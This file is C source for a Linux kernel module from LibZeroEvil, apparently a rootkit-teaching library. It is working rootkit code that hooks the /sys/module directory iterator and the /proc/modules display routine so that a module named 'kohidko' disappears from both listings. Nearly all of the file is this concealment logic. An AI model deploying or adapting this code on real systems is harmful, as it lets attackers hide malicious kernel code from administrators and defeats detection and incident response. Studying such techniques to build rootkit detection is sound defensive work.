// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
// struct seq_file.
# include <linux/seq_file.h>
# endif // CPP

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define ROOT_PATH "/sys/module"
# define PROC_PATH "/proc/modules"
# define SECRET_MODULE "kohidko"

int
(*real_iterate)(struct file *filp, struct dir_context *ctx);
int
(*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);
int
fake_iterate(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);

int
(*real_seq_show)(struct seq_file *seq, void *v);
int
fake_seq_show(struct seq_file *seq, void *v);


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);
    set_file_seq_op(show, PROC_PATH, fake_seq_show, real_seq_show);

    if (!real_iterate) {
        return -ENOENT;
    }

    return 0;
}


void
cleanup_module(void)
{
    if (real_iterate) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
    }

    if (real_seq_show) {
        void *dummy;
        set_file_seq_op(show, PROC_PATH, real_seq_show, dummy);
    }

    fm_alert("%s\n", "Farewell the World!");
    return;
}


int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strcmp(name, SECRET_MODULE) == 0) {
        fm_alert("Hiding module: %s", name);
        return 0;
    }

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}


int
fake_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    size_t last_count, last_size;

    last_count = seq->count;
    ret =  real_seq_show(seq, v);
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULE,
                last_size)) {
        fm_alert("Hiding module: %s\n", SECRET_MODULE);
        seq->count -= last_size;
    }

    return ret;
}
